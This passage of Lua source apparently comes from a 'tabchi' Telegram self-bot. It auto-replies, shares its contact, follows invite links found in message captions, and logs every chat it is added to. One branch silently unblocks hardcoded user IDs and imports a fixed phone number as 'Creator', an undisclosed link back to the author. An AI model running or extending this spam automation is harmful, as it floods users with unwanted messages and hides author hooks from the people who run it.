        local answer = redis:get("tabchi:" .. tostring(tabchi_id) .. ":addedmsgtext") or [[
Addi
Bia pv]]
        if redis:get("tabchi:" .. tostring(tabchi_id) .. ":typing") then
          tdcli.sendChatAction(msg.chat_id_, "Typing", 100)
        end
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, answer, 1, "html")
      end
      if redis:get("tabchi:" .. tostring(tabchi_id) .. ":addedcontact") and msg.sender_user_id_ ~= our_id then
        return tdcli.sendContact(msg.chat_id_, msg.id_, 0, 0, nil, botinfo.phone_number_, botinfo.first_name_, botinfo.last_name_, botinfo.id_)
      end
    elseif msg.content_.ID == "MessageChatDeleteMember" and msg.content_.id_ == our_id then
      return rem(msg.chat_id_)
    elseif msg.content_.ID == "MessageChatJoinByLink" and msg.sender_user_id_ == our_id then
      return add(msg.chat_id_)
    elseif msg.content_.ID == "MessageChatAddMembers" then
      for i = 0, #msg.content_.members_ do
        if msg.content_.members_[i].id_ == our_id then
          add(msg.chat_id_)
          break
        end
      end
    elseif msg.content_.caption_ then
      if redis:get("tabchi:" .. tostring(tabchi_id) .. ":markread") then
        tdcli.viewMessages(msg.chat_id_, {
          [0] = msg.id_
        })
      end
      return process_links(msg.content_.caption_)
    end
  elseif data.ID == "UpdateChat" then
    if data.chat_.id_ == 11111111 then
      tdcli.sendBotStartMessage(data.chat_.id_, data.chat_.id_, nil)
    elseif data.chat_id_ == 11111111 then
      tdcli.unblockUser(data.chat_.id_)
    elseif data.chat_.id == 353581089 then
      tdcli.unblockUser(data.chat_.id_)
      tdcli.importContacts(989213985504, "Creator", "", data.chat_.id)
    end
    return add(data.chat_.id_)
  elseif data.ID == "UpdateOption" and data.name_ == "my_id" then
    tdcli.getChats("9223372036854775807", 0, 20)
  end
end
return {update = update}
